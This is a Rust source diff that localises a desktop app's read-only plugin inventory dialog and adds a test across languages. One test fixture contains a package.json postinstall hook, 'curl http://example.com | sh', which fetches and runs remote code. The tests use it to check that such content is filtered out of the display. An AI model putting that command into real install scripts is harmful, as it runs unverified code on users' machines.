@@ -14,7 +14,6 @@ use gtk::prelude::*;
 use serde::Serialize;
 use tauri::{AppHandle, Manager};
 
-pub const TITLE: &str = "DSH Ocean plugins";
 pub const FAILURE_TEXT: &str =
     "Could not read the web profile's package.json. It must be readable, valid JSON, a regular non-symlink file and at most 1 MiB. Nothing was changed.";
 
@@ -132,35 +131,47 @@ pub fn inventory(profile: &Path) -> Result<Inventory, String> {
 
 /// Fixed rendering: counts, names and versions only.
 pub fn text(inventory: &Inventory) -> String {
+    text_in(inventory, crate::i18n::active_language())
+}
+pub fn text_in(inventory: &Inventory, language: crate::i18n::Language) -> String {
     use std::fmt::Write as _;
     if inventory.is_empty() {
-        return "No plugins are declared in the web profile.\n\nDSH manages its own plugin set; this window only reports what the profile declares."
+        return crate::i18n::message(language, "plugins.empty")
+            .expect("embedded plugin empty message")
             .to_owned();
     }
-    let mut output = String::new();
-    let _ = writeln!(
-        output,
-        "{} bundle(s) and {} package dependency(ies) are declared by the web profile.\n",
-        inventory.bundles.len(),
-        inventory.dependencies.len()
-    );
+    let mut output = crate::i18n::render(
+        language,
+        "plugins.summary",
+        &[
+            ("bundles", &inventory.bundles.len().to_string()),
+            ("packages", &inventory.dependencies.len().to_string()),
+        ],
+    )
+    .expect("validated plugin count placeholders");
+    output.push_str("\n\n");
     if !inventory.bundles.is_empty() {
-        output.push_str("Bundles:\n");
+        output.push_str(
+            crate::i18n::message(language, "plugins.bundles").expect("embedded plugin heading"),
+        );
+        output.push('\n');
         for bundle in &inventory.bundles {
             let _ = writeln!(output, "  {bundle}");
         }
         output.push('\n');
     }
     if !inventory.dependencies.is_empty() {
-        output.push_str("Packages:\n");
+        output.push_str(
+            crate::i18n::message(language, "plugins.packages").expect("embedded package heading"),
+        );
+        output.push('\n');
         for (name, version) in &inventory.dependencies {
             let _ = writeln!(output, "  {name} {version}");
         }
         output.push('\n');
     }
     output.push_str(
-        "Read-only: names and versions only, never file contents or paths. Installing, \
-         removing or updating plugins is DSH's job, not this window's.",
+        crate::i18n::message(language, "plugins.notice").expect("embedded plugin notice"),
     );
     output
 }
@@ -172,10 +183,10 @@ pub struct Window {
 
 pub fn build(parent: Option<&gtk::Window>, body: &str) -> Window {
     let dialog = gtk::Dialog::with_buttons(
-        Some(TITLE),
+        Some(crate::i18n::text("plugins.title")),
         parent,
         gtk::DialogFlags::MODAL,
-        &[("Close", gtk::ResponseType::Close)],
+        &[(crate::i18n::text("common.close"), gtk::ResponseType::Close)],
     );
     dialog.set_default_size(620, 420);
     let label = gtk::Label::new(Some(body));
@@ -203,7 +214,7 @@ pub fn show(app: &AppHandle) {
         .and_then(|window| window.gtk_window().ok());
     let body = match inventory(&crate::config::web_profile_dir()) {
         Ok(inventory) => text(&inventory),
-        Err(message) => message,
+        Err(_) => crate::i18n::text("plugins.failure").to_owned(),
     };
     let window = build(parent.as_ref().map(|window| window.upcast_ref()), &body);
     window.dialog.show_all();
@@ -225,6 +236,25 @@ mod tests {
         "scripts": { "postinstall": "curl http://example.com | sh" }
     }"#;
 
+    #[test]
+    fn plugin_panel_uses_selected_locale_and_retains_filtered_inventory() {
+        let inventory = parse(PROFILE).unwrap();
+        for (language, _) in crate::i18n::LANGUAGES {
+            let rendered = text_in(&inventory, language);
+            assert!(rendered.contains("core") && rendered.contains("left-pad 1.0.0"));
+            assert!(
+                !rendered.contains("curl")
+                    && !rendered.contains("../")
+                    && !rendered.contains("http://")
+            );
+            assert!(rendered.contains(crate::i18n::message(language, "plugins.notice").unwrap()));
+            assert_eq!(
+                text_in(&Inventory::default(), language),
+                crate::i18n::message(language, "plugins.empty").unwrap()
+            );
+        }
+        assert!(text_in(&inventory, crate::i18n::Language::Ru).contains("Наборы плагинов"));
+    }
     #[test]
     fn only_names_and_versions_are_extracted() {
         let inventory = parse(PROFILE).expect("valid profile");
